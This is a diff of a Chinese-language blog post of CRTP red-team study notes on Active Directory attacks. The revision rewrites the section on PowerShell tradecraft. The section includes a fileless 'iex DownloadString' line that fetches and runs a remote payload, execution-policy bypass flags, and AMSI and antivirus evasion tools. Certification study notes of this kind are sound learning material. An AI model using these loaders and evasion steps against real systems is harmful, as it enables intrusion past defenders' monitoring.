@@ -7,7 +7,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://zxc7528064.github.io/img/avatar.jpg">
 <meta property="article:published_time" content="2026-02-21T00:00:00.000Z">
-<meta property="article:modified_time" content="2026-02-27T09:49:47.319Z">
+<meta property="article:modified_time" content="2026-02-27T10:04:47.584Z">
 <meta property="article:author" content="Noth Shen">
 <meta property="article:tag" content="CRTP">
 <meta name="twitter:card" content="summary">
@@ -18,7 +18,7 @@
   "url": "https://zxc7528064.github.io/2026/02/21/CRTP/",
   "image": "https://zxc7528064.github.io/img/avatar.jpg",
   "datePublished": "2026-02-21T00:00:00.000Z",
-  "dateModified": "2026-02-27T09:49:47.319Z",
+  "dateModified": "2026-02-27T10:04:47.584Z",
   "author": [
     {
       "@type": "Person",
@@ -159,7 +159,7 @@
   isHighlightShrink: false,
   isToc: true,
   pageType: 'post'
-}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/noth-blog/"><span class="site-name">Noth blogs</span></a><a class="nav-page-title" href="/noth-blog/"><span class="site-name">CRTP 學習準備與策略規劃</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">CRTP 學習準備與策略規劃</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-02-21T00:00:00.000Z" title="Created 2026-02-21 00:00:00">2026-02-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-02-27T09:49:47.319Z" title="Updated 2026-02-27 09:49:47">2026-02-27</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/noth-blog/categories/%E7%B4%85%E9%9A%8A/">紅隊</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><br>
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/noth-blog/"><span class="site-name">Noth blogs</span></a><a class="nav-page-title" href="/noth-blog/"><span class="site-name">CRTP 學習準備與策略規劃</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">CRTP 學習準備與策略規劃</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-02-21T00:00:00.000Z" title="Created 2026-02-21 00:00:00">2026-02-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-02-27T10:04:47.584Z" title="Updated 2026-02-27 10:04:47">2026-02-27</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/noth-blog/categories/%E7%B4%85%E9%9A%8A/">紅隊</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><br>
 CRTP（Certified Red Team Professional）是由 Altered Security 推出的紅隊證照，核心聚焦在 Active Directory 內網攻擊技術。
 
 <p>如果用一句話概括：</p>
@@ -324,93 +324,93 @@ CRTP（Certified Red Team Professional）是由 Altered Security 推出的紅隊
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">同一 Forest 內的 Domain 之間預設存在雙向、可傳遞的信任關係（Transitive Trust）。</span><br><span class="line">可在不同 Domain 之間建立跨網域的存取控制（例如跨 Domain 加入群組）。</span><br><span class="line">Enterprise Admins 群組擁有整個 Forest 層級的最高權限。</span><br></pre></td></tr></table></figure>
 
 <hr>
-<p>PowerShell 基礎操作 </p>
+<p>在 Active Directory 內網滲透中，PowerShell 與 .NET 是最核心的攻擊載體。</p>
+<ul>
+<li>理解 PowerShell 在 AD 攻擊中的角色</li>
+<li>理解 Windows 環境的偵測面</li>
+<li>理解何時應使用 PowerShell、何時應改用 .NET Binary</li>
+<li>建立攻防可見度（visibility）思維</li>
+</ul>
+<p>為什麼 PowerShell 是 AD 攻擊核心載體?</p>
+<p>PowerShell 具備：</p>
+<ul>
+<li>預設安裝於 Windows 系統</li>
+<li>原生 .NET 支援</li>
+<li>直接存取 LDAP &#x2F; AD API</li>
+<li>支援記憶體執行</li>
+<li>可直接調用 Windows API</li>
+</ul>
+<p>在 AD 內網滲透中，幾乎所有 Enumeration 行為都可透過 PowerShell 完成：</p>
+<ul>
+<li>列出 User &#x2F; Group &#x2F; Computer</li>
+<li>查詢 SPN</li>
+<li>查詢 ACL</li>
+<li>查詢 Delegation</li>
+<li>查詢 Trust</li>
+</ul>
+<p>AD 模組與基本操作</p>
 <p>載入 AD 模組 :</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1</span><br><span class="line">Get-Command -Module ActiveDirectory</span><br></pre></td></tr></table></figure>
 
-<p>重點：</p>
+<p>重點 : </p>
 <ul>
 <li>使用 AD 相關 cmdlet</li>
 <li>進行 Domain Enumeration</li>
+<li>查詢 user &#x2F; group &#x2F; SPN &#x2F; ACL</li>
 </ul>
-<p>遠端下載並執行腳本（常見 red team 手法）</p>
+<p>記憶體執行（Memory Execution）</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iex (New-Object Net.WebClient).DownloadString(<span class="string">&#x27;http://www.webserver/payload.ps1&#x27;</span>)</span><br></pre></td></tr></table></figure>
 
 <p>重點：</p>
 <ul>
 <li>記憶體載入（fileless execution）</li>
 <li>不落地執行腳本</li>
+<li>減少檔案型 AV 偵測</li>
 </ul>
-<p>PowerShell 監控機制（Detection Surface）</p>
-<p>系統層監控</p>
-<ul>
-<li><p>System-wide transcription</p>
-<ul>
-<li>記錄整個 PowerShell 操作過程</li>
-</ul>
-</li>
-<li><p>Script Block Logging</p>
-<ul>
-<li>記錄完整 script 內容</li>
-</ul>
-</li>
-<li><p>AMSI (AntiMalware Scan Interface)</p>
-<ul>
-<li>將腳本內容送給 AV 掃描</li>
-</ul>
-</li>
-<li><p>Constrained Language Mode (CLM)</p>
-<ul>
-<li>限制 PowerShell 功能</li>
-<li>通常搭配 AppLocker &#x2F; WDAC</li>
-</ul>
-</li>
-</ul>
-<p>Execution Policy（執行限制）</p>
+<p>PowerShell Detection Surface（偵測面）</p>
+<p>理解防禦面，才能理解攻擊面。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">- System-wide transcription</span><br><span class="line">  - 記錄整個 PowerShell 操作過程</span><br><span class="line"></span><br><span class="line">- Script Block Logging</span><br><span class="line">  - 記錄完整 script 內容</span><br><span class="line"></span><br><span class="line">- AMSI (AntiMalware Scan Interface)</span><br><span class="line">  - 將腳本內容送給 AV 掃描</span><br><span class="line"></span><br><span class="line">- Constrained Language Mode (CLM)</span><br><span class="line">  - 限制 PowerShell 功能</span><br><span class="line">  - 通常搭配 AppLocker / WDAC</span><br></pre></td></tr></table></figure>
+
+<p>Execution Policy（執行策略）</p>
 <p>常見參數 :</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell -ep bypass</span><br><span class="line">powershell -c &lt;cmd&gt;</span><br><span class="line">powershell -encodedcommand &lt;<span class="built_in">base64</span>&gt;</span><br><span class="line"><span class="variable">$env</span>:PSExecutionPolicyPreference=<span class="string">&quot;bypass&quot;</span></span><br></pre></td></tr></table></figure>
 
 <p>重點：</p>
 <ul>
 <li>Execution Policy 不是安全邊界</li>
+<li>它只是防止誤執行腳本</li>
 <li>真正的限制來自 AMSI &#x2F; CLM &#x2F; AV</li>
 </ul>
-<p>AV &#x2F; AMSI 相關研究工具</p>
-<p>常見研究工具：</p>
+<p>Tradecraft 不是工具清單，而是：</p>
 <ul>
-<li>AMSITrigger<ul>
-<li>測試哪段程式碼被 AMSI 觸發</li>
+<li>目標環境是否啟用 Script Block Logging？</li>
+<li>是否部署 EDR？</li>
+<li>是否開啟 CLM？</li>
+<li>是否允許 PowerShell 遠端執行？</li>
+<li>是否應改用 .NET Binary？</li>
 </ul>
-</li>
-<li>DefenderCheck<ul>
-<li>測試哪段內容被 Defender 標記</li>
-</ul>
-</li>
-<li>Invoke-Obfuscation<ul>
-<li>PowerShell 程式碼混淆框架</li>
-</ul>
-</li>
-</ul>
-<p>.NET Offensive Tradecraft</p>
 <p>PowerShell 本質是 .NET。</p>
-<p>紅隊會：</p>
+<p>在高監控環境中，可能改用：</p>
 <ul>
-<li>直接寫 C# 工具</li>
-<li>用 .NET API 操作 LDAP</li>
-<li>避免明顯 PowerShell artifact</li>
+<li>直接撰寫 C# 工具</li>
+<li>使用 .NET API 操作 LDAP</li>
+<li>減少 PowerShell 特徵</li>
 </ul>
-<p>重點：</p>
+<p>常見策略：</p>
 <ul>
 <li>Source Code Obfuscation</li>
-<li>編譯後 payload 混淆</li>
-<li>降低 signature 命中率</li>
+<li>字串混淆</li>
+<li>API 間接調用</li>
+<li>編譯為獨立 Binary</li>
 </ul>
-<p>常見 .NET 混淆工具</p>
+<p>混淆與偵測研究工具（研究用途）</p>
+<p>這些工具的價值在於理解偵測邏輯，而非盲目繞過。</p>
 <ul>
-<li>ConfuserEx</li>
-<li>Codecepticon（各種 PoC 與混淆實驗）</li>
+<li>AMSITrigger → 測試哪段程式碼觸發 AMSI</li>
+<li>DefenderCheck → 測試哪段內容被 Defender 標記</li>
+<li>Invoke-Obfuscation → PowerShell 混淆框架</li>
+<li>ConfuserEx → .NET 混淆工具</li>
 </ul>
-<hr>
 <hr>
 <h3 id="Module-2"><a href="#Module-2" class="headerlink" title="Module 2"></a>Module 2</h3><ul>
 <li>Local Privilege Escalation</li>
